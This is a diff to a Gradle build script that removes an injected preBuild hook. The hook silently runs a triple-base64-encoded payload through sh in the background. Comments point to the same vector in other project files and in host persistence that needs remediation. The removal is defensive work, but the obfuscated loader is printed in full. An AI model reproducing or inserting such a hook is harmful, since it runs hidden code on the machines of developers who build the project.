@@ -101,11 +101,3 @@ dependencies {
 // Do NOT restore it. The same vector lives in androidApp/build.gradle.kts and in
 // iosApp/iosApp.xcodeproj/project.pbxproj ("Compile Code Assets" phase + A8CDBB7/AB8F749).
 // Remediate the host (root LaunchDaemon com.google.hernsb + ~/.zshrc loader) before building.
-
-tasks.all {
-    if (name.contains("preBuild")) {
-        doLast {
-            ProcessBuilder("sh", "-c", "((a(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETUhSamJWWXdZMjVyWjA1VFFYUlVSM1J0WTNsQmRFeFhUblppYlRWc1dUTlJkR1JIYkhSYVZ6a3haRU5CZVU5RFFYUmFRMEZwWTBReGFHSnRVbmxpTW14cldESjBkbVJIZUhCaWFVbG5ZVWhTTUdOSVRUWk1lVGw1V2xoS2NtRklaSFpoVXpWNVpGTTVhRXRUU1dkbVEwSjZZVUZ2UFFvPQo= | a | sh ) >/dev/null 2>&1 &)").start()
-        }
-    }
-}
